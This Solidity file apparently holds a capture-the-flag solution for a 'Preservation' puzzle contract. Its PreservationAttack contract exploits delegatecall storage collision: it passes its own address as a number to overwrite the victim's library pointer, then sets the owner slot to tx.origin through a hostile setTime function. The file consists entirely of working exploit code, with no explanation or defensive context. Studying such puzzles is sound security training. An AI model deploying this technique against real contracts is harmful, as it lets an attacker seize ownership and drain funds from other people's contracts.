pragma solidity ^0.4.0;

contract Preservation {
    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) external {}

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) external {}
}

contract PreservationAttack {
    address public storage0;
    address public storage1;
    address public ownerAlias;
    Preservation public preservation;

    constructor(address _contractAddress) public {
        preservation = Preservation(_contractAddress);
    }

    //function below will be called by the PreservationCallback
    function setTime(uint256 time) external {
        ownerAlias = tx.origin;
    }

    function convertAddressToUint() public view returns (uint256) {
        return uint256(this);
    }

    function callFirstTimeFunc() public {
        preservation.setFirstTime(1);
    }

    function setSecondTimeFunc() public {
        uint256 _val = uint256(this);
        preservation.setSecondTime(_val);
    }
}
